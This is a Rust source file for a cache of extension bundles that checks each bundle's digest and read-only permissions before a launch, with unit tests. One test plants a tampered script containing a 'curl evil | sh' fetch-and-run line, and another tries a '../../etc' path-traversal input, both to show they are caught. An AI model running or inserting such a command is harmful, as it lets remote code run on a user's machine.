//! The content-addressed bundle cache on a host that runs placed extension processes.
//!
//! A bundle is written privately, verified against its digest from what actually landed on disk,
//! made read-only, and only then moved to the name its digest gives it. Nothing ever runs from a
//! staging directory, and nothing runs from the cache without being verified again first: every
//! launch re-reads the bundle and recomputes its digest, so a file changed after it was staged -
//! by an editor, a stray `chmod`, or a process deliberately tampering with another extension's
//! code - is caught before the next process starts from it, and the bundle is discarded and staged
//! again from the client.
//!
//! The read-only modes are what stop accidental mutation. They cannot stop a process running as
//! the same user that sets out to undo them; nothing short of a different user can. That is why
//! the verification does not trust them either: a bundle whose files have regained a write bit is
//! treated as tampered with, the same as one whose contents changed.

use std::io;
use std::path::{Path, PathBuf};

use super::bundle::{self, Bundle, BundleFile};

/// How many bundles the cache keeps beyond those in use. Each edit of a linked extension is a new
/// bundle, so without a bound the cache only ever grows.
const RETAINED_BUNDLES: usize = 16;

#[derive(Debug, PartialEq, Eq)]
pub enum StoreError {
    /// No bundle with this digest is cached; the client should send it.
    Missing,
    /// The cached bundle no longer matches its digest and has been discarded.
    Corrupt(String),
    Io(String),
}

impl std::fmt::Display for StoreError {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Missing => f.write_str("bundle is not staged on this host"),
            Self::Corrupt(detail) => {
                write!(f, "staged bundle was modified and discarded: {detail}")
            }
            Self::Io(detail) => f.write_str(detail),
        }
    }
}

pub struct BundleStore {
    root: PathBuf,
}

impl BundleStore {
    /// The cache directory for this host's user, created private if it does not exist.
    pub fn open_default() -> io::Result<Self> {
        let env = crate::platform::paths::PlatformEnv::from_process();
        Self::open(crate::platform::paths::cache_dir(&env).join("extension-bundles"))
    }

    pub fn open(root: PathBuf) -> io::Result<Self> {
        crate::platform::fs_security::ensure_private_dir(&root)?;
        Ok(Self { root })
    }

    pub fn root(&self) -> &Path {
        &self.root
    }

    fn path_for(&self, digest: &str) -> Result<PathBuf, StoreError> {
        if !bundle::is_digest(digest) {
            return Err(StoreError::Io(format!("`{digest}` is not a bundle digest")));
        }
        Ok(self.root.join(digest))
    }

    /// Write `bundle` into the cache and return where it lives.
    pub fn stage(&self, bundle: &Bundle) -> Result<PathBuf, StoreError> {
        let target = self.path_for(bundle.digest())?;
        if self.verified(bundle.digest()).is_ok() {
            return Ok(target);
        }
        let staging = self.root.join(format!(".staging-{}", random_suffix()));
        let result = write_bundle(&staging, bundle)
            .map_err(|error| StoreError::Io(format!("cannot stage bundle: {error}")))
            .and_then(|()| verify(&staging, bundle.digest(), false))
            .and_then(|()| {
                seal(&staging).map_err(|error| {
                    StoreError::Io(format!("cannot make the bundle read-only: {error}"))
                })
            })
            .and_then(|()| {
                // Re-verify after sealing: the modes are part of what verification checks.
                verify(&staging, bundle.digest(), true)
            });
        if let Err(error) = result {
            discard(&staging);
            return Err(error);
        }
        if target.exists() {
            discard(&target);
        }
        if let Err(error) = std::fs::rename(&staging, &target) {
            discard(&staging);
            return Err(StoreError::Io(format!("cannot install bundle: {error}")));
        }
        Ok(target)
    }

    /// The cached bundle for `digest`, verified now. A bundle that fails is discarded.
    pub fn verified(&self, digest: &str) -> Result<PathBuf, StoreError> {
        let path = self.path_for(digest)?;
        match std::fs::symlink_metadata(&path) {
            Err(error) if error.kind() == io::ErrorKind::NotFound => {
                return Err(StoreError::Missing);
            }
            Err(error) => return Err(StoreError::Io(error.to_string())),
            Ok(metadata) if !metadata.is_dir() => {
                discard(&path);
                return Err(StoreError::Corrupt("not a directory".to_string()));
            }
            Ok(_) => {}
        }
        match verify(&path, digest, true) {
            Ok(()) => {
                // Recency for pruning; failing to record it costs nothing but ordering.
                touch(&path);
                Ok(path)
            }
            Err(error) => {
                discard(&path);
                Err(error)
            }
        }
    }

    /// Drop all but the most recently used bundles, never one in `keep`.
    pub fn prune(&self, keep: &std::collections::HashSet<String>) {
        let Ok(entries) = std::fs::read_dir(&self.root) else {
            return;
        };
        let mut bundles: Vec<(std::time::SystemTime, PathBuf, String)> = Vec::new();
        for entry in entries.flatten() {
            let name = entry.file_name().to_string_lossy().to_string();
            if name.starts_with(".staging-") {
                // A staging directory survives only a runtime that died mid-write.
                discard(&entry.path());
                continue;
            }
            if !bundle::is_digest(&name) || keep.contains(&name) {
                continue;
            }
            let modified = entry
                .metadata()
                .and_then(|metadata| metadata.modified())
                .unwrap_or(std::time::UNIX_EPOCH);
            bundles.push((modified, entry.path(), name));
        }
        bundles.sort_by_key(|bundle| std::cmp::Reverse(bundle.0));
        for (_, path, _) in bundles.into_iter().skip(RETAINED_BUNDLES) {
            discard(&path);
        }
    }
}

fn write_bundle(root: &Path, bundle: &Bundle) -> io::Result<()> {
    std::fs::create_dir(root)?;
    restrict_directory(root)?;
    for file in bundle.files() {
        let path = bundle::join_relative(root, &file.path);
        if let Some(parent) = path.parent() {
            std::fs::create_dir_all(parent)?;
        }
        let mut options = std::fs::OpenOptions::new();
        options.write(true).create_new(true);
        #[cfg(unix)]
        {
            use std::os::unix::fs::OpenOptionsExt;
            options.mode(0o600);
        }
        let mut handle = options.open(&path)?;
        std::io::Write::write_all(&mut handle, &file.contents)?;
        handle.sync_all()?;
    }
    write_modes(root, bundle)?;
    Ok(())
}

/// Read a cached bundle back exactly as a process would see it and compare its digest.
fn verify(root: &Path, digest: &str, sealed: bool) -> Result<(), StoreError> {
    let executables = read_modes(root);
    let mut files = Vec::new();
    collect(root, String::new(), &executables, sealed, &mut files).map_err(StoreError::Corrupt)?;
    let found = Bundle::from_files(files).map_err(StoreError::Corrupt)?;
    if found.digest() != digest {
        return Err(StoreError::Corrupt(format!(
            "content digest is {}, expected {digest}",
            found.digest()
        )));
    }
    Ok(())
}

fn collect(
    directory: &Path,
    prefix: String,
    executables: &Option<std::collections::HashSet<String>>,
    sealed: bool,
    files: &mut Vec<BundleFile>,
) -> Result<(), String> {
    let mut entries: Vec<_> = std::fs::read_dir(directory)
        .map_err(|error| error.to_string())?
        .collect::<io::Result<_>>()
        .map_err(|error| error.to_string())?;
    entries.sort_by_key(|entry| entry.file_name());
    for entry in entries {
        let name = entry.file_name().to_string_lossy().to_string();
        if prefix.is_empty() && name == MODES_FILE {
            continue;
        }
        let relative = if prefix.is_empty() {
            name.clone()
        } else {
            format!("{prefix}/{name}")
        };
        let metadata =
            std::fs::symlink_metadata(entry.path()).map_err(|error| error.to_string())?;
        if metadata.file_type().is_symlink() {
            return Err(format!("{relative} became a symbolic link"));
        }
        if sealed && writable(&metadata) {
            return Err(format!("{relative} is writable again"));
        }
        if metadata.is_dir() {
            collect(&entry.path(), relative, executables, sealed, files)?;
        } else if metadata.is_file() {
            let contents = std::fs::read(entry.path()).map_err(|error| error.to_string())?;
            let executable = match executables {
                Some(set) => set.contains(&relative),
                None => mode_executable(&metadata),
            };
            files.push(BundleFile {
                path: relative,
                executable,
                contents,
            });
        } else {
            return Err(format!("{relative} is not a regular file"));
        }
    }
    Ok(())
}

/// Remove every write permission, deepest first, so the bundle is read-only before it gets a name
/// anything can start a process from.
fn seal(directory: &Path) -> io::Result<()> {
    for entry in std::fs::read_dir(directory)? {
        let path = entry?.path();
        if std::fs::symlink_metadata(&path)?.is_dir() {
            seal(&path)?;
        } else {
            seal_file(&path)?;
        }
    }
    seal_dir(directory)
}

#[cfg(unix)]
fn seal_file(path: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    // The owner execute bit `write_modes` set is the one thing kept.
    let mode = if pending_executable(path) {
        0o500
    } else {
        0o400
    };
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode))
}

#[cfg(not(unix))]
fn seal_file(path: &Path) -> io::Result<()> {
    let mut permissions = std::fs::metadata(path)?.permissions();
    permissions.set_readonly(true);
    std::fs::set_permissions(path, permissions)
}

#[cfg(unix)]
fn seal_dir(path: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o500))
}

#[cfg(not(unix))]
fn seal_dir(_path: &Path) -> io::Result<()> {
    Ok(())
}

#[cfg(unix)]
fn restrict_directory(path: &Path) -> io::Result<()> {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o700))
}

#[cfg(not(unix))]
fn restrict_directory(_path: &Path) -> io::Result<()> {
    Ok(())
}

#[cfg(unix)]
fn writable(metadata: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o222 != 0
}

#[cfg(not(unix))]
fn writable(metadata: &std::fs::Metadata) -> bool {
    metadata.is_file() && !metadata.permissions().readonly()
}

#[cfg(unix)]
fn mode_executable(metadata: &std::fs::Metadata) -> bool {
    use std::os::unix::fs::PermissionsExt;
    metadata.permissions().mode() & 0o100 != 0
}

#[cfg(not(unix))]
fn mode_executable(_metadata: &std::fs::Metadata) -> bool {
    false
}

/// Where executable bits are recorded on a host that has none. Unix keeps them as modes; Windows
/// keeps a list beside the files, sealed with them, so a bundle round-trips to the same digest.
const MODES_FILE: &str = ".rozi-executables";

#[cfg(unix)]
fn write_modes(root: &Path, bundle: &Bundle) -> io::Result<()> {
    // Recorded as a pending mode until `seal` applies the final, read-only one.
    use std::os::unix::fs::PermissionsExt;
    for file in bundle.files() {
        let mode = if file.executable { 0o700 } else { 0o600 };
        std::fs::set_permissions(
            bundle::join_relative(root, &file.path),
            std::fs::Permissions::from_mode(mode),
        )?;
    }
    Ok(())
}

#[cfg(unix)]
fn pending_executable(path: &Path) -> bool {
    use std::os::unix::fs::PermissionsExt;
    std::fs::metadata(path).is_ok_and(|metadata| metadata.permissions().mode() & 0o100 != 0)
}

#[cfg(unix)]
fn read_modes(_root: &Path) -> Option<std::collections::HashSet<String>> {
    None
}

#[cfg(not(unix))]
fn write_modes(root: &Path, bundle: &Bundle) -> io::Result<()> {
    let list: Vec<&str> = bundle
        .files()
        .iter()
        .filter(|file| file.executable)
        .map(|file| file.path.as_str())
        .collect();
    std::fs::write(root.join(MODES_FILE), list.join("\n"))
}

#[cfg(not(unix))]
fn read_modes(root: &Path) -> Option<std::collections::HashSet<String>> {
    let text = std::fs::read_to_string(root.join(MODES_FILE)).unwrap_or_default();
    Some(
        text.lines()
            .filter(|line| !line.is_empty())
            .map(str::to_string)
            .collect(),
    )
}

/// Remove a bundle directory whatever its modes.
fn discard(path: &Path) {
    unseal(path);
    let _ = std::fs::remove_dir_all(path);
}

fn unseal(path: &Path) {
    let Ok(metadata) = std::fs::symlink_metadata(path) else {
        return;
    };
    if metadata.file_type().is_symlink() {
        return;
    }
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        let mode = if metadata.is_dir() { 0o700 } else { 0o600 };
        let _ = std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode));
    }
    #[cfg(not(unix))]
    {
        let mut permissions = metadata.permissions();
        #[allow(clippy::permissions_set_readonly_false)]
        permissions.set_readonly(false);
        let _ = std::fs::set_permissions(path, permissions);
    }
    if metadata.is_dir()
        && let Ok(entries) = std::fs::read_dir(path)
    {
        for entry in entries.flatten() {
            unseal(&entry.path());
        }
    }
}

fn touch(path: &Path) {
    let _ = std::fs::File::open(path)
        .and_then(|directory| directory.set_modified(std::time::SystemTime::now()));
}

fn random_suffix() -> String {
    let mut bytes = [0u8; 8];
    getrandom::fill(&mut bytes).expect("operating-system randomness unavailable");
    bytes.iter().map(|byte| format!("{byte:02x}")).collect()
}

#[cfg(test)]
mod tests {
    use super::*;

    fn sample() -> Bundle {
        Bundle::from_files(vec![
            BundleFile {
                path: "extension.toml".to_string(),
                executable: false,
                contents: b"[extension]\n".to_vec(),
            },
            BundleFile {
                path: "bin/run".to_string(),
                executable: true,
                contents: b"#!/bin/sh\necho hi\n".to_vec(),
            },
        ])
        .unwrap()
    }

    fn store() -> (tempfile::TempDir, BundleStore) {
        let temp = tempfile::tempdir().unwrap();
        let store = BundleStore::open(temp.path().join("bundles")).unwrap();
        (temp, store)
    }

    #[test]
    fn a_staged_bundle_is_verified_read_only_and_named_by_its_digest() {
        let (_temp, store) = store();
        let bundle = sample();
        assert_eq!(store.verified(bundle.digest()), Err(StoreError::Missing));
        let path = store.stage(&bundle).unwrap();
        assert_eq!(path, store.root().join(bundle.digest()));
        assert_eq!(store.verified(bundle.digest()).unwrap(), path);
        let run = path.join("bin/run");
        assert_eq!(std::fs::read(&run).unwrap(), b"#!/bin/sh\necho hi\n");
        assert!(std::fs::metadata(&run).unwrap().permissions().readonly());
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            assert_eq!(
                std::fs::metadata(&run).unwrap().permissions().mode() & 0o777,
                0o500
            );
            // Nothing can be added beside the files either.
            assert!(std::fs::write(path.join("bin/extra"), b"x").is_err());
        }
        // Staging again is a no-op on a verified bundle.
        assert_eq!(store.stage(&bundle).unwrap(), path);
    }

    /// The modes stop an accident, not a determined same-user process. Verification catches what
    /// gets past them, and the next launch never runs the changed file.
    #[test]
    fn a_file_changed_after_verification_is_caught_and_the_bundle_discarded() {
        let (_temp, store) = store();
        let bundle = sample();
        let path = store.stage(&bundle).unwrap();
        let run = path.join("bin/run");
        let mut permissions = std::fs::metadata(&run).unwrap().permissions();
        #[allow(clippy::permissions_set_readonly_false)]
        permissions.set_readonly(false);
        #[cfg(unix)]
        {
            use std::os::unix::fs::PermissionsExt;
            std::fs::set_permissions(path.join("bin"), std::fs::Permissions::from_mode(0o700))
                .unwrap();
        }
        std::fs::set_permissions(&run, permissions).unwrap();
        std::fs::write(&run, b"#!/bin/sh\ncurl evil | sh\n").unwrap();

        assert!(matches!(
            store.verified(bundle.digest()),
            Err(StoreError::Corrupt(_))
        ));
        assert!(!path.exists(), "a tampered bundle is discarded");
        assert_eq!(store.verified(bundle.digest()), Err(StoreError::Missing));
        // And staging it again restores the real files.
        store.stage(&bundle).unwrap();
        assert_eq!(
            std::fs::read(store.verified(bundle.digest()).unwrap().join("bin/run")).unwrap(),
            b"#!/bin/sh\necho hi\n"
        );
    }

    #[test]
    fn a_write_bit_regained_without_a_content_change_still_counts_as_tampering() {
        let (_temp, store) = store();
        let bundle = sample();
        let path = store.stage(&bundle).unwrap();
        let file = path.join("extension.toml");
        let mut permissions = std::fs::metadata(&file).unwrap().permissions();
        #[allow(clippy::permissions_set_readonly_false)]
        permissions.set_readonly(false);
        std::fs::set_permissions(&file, permissions).unwrap();
        assert!(matches!(
            store.verified(bundle.digest()),
            Err(StoreError::Corrupt(_))
        ));
    }

    #[test]
    fn an_added_or_missing_file_is_caught() {
        let (_temp, store) = store();
        let bundle = sample();
        let path = store.stage(&bundle).unwrap();
        unseal(&path);
        std::fs::remove_file(path.join("extension.toml")).unwrap();
        seal(&path).unwrap();
        assert!(matches!(
            store.verified(bundle.digest()),
            Err(StoreError::Corrupt(_))
        ));
    }

    #[test]
    fn a_digest_that_could_name_another_path_is_refused() {
        let (_temp, store) = store();
        assert!(matches!(
            store.verified("../../etc"),
            Err(StoreError::Io(_))
        ));
    }

    #[test]
    fn pruning_keeps_the_bundles_in_use_and_the_most_recent_rest() {
        let (_temp, store) = store();
        let mut digests = Vec::new();
        for index in 0..(RETAINED_BUNDLES + 3) {
            let bundle = Bundle::from_files(vec![BundleFile {
                path: "n".to_string(),
                executable: false,
                contents: index.to_string().into_bytes(),
            }])
            .unwrap();
            store.stage(&bundle).unwrap();
            digests.push(bundle.digest().to_string());
        }
        std::fs::create_dir(store.root().join(".staging-leftover")).unwrap();
        let keep: std::collections::HashSet<_> = [digests[0].clone()].into_iter().collect();
        store.prune(&keep);
        let remaining = std::fs::read_dir(store.root()).unwrap().count();
        assert_eq!(remaining, RETAINED_BUNDLES + 1);
        assert!(store.root().join(&digests[0]).exists());
        assert!(!store.root().join(".staging-leftover").exists());
    }
}
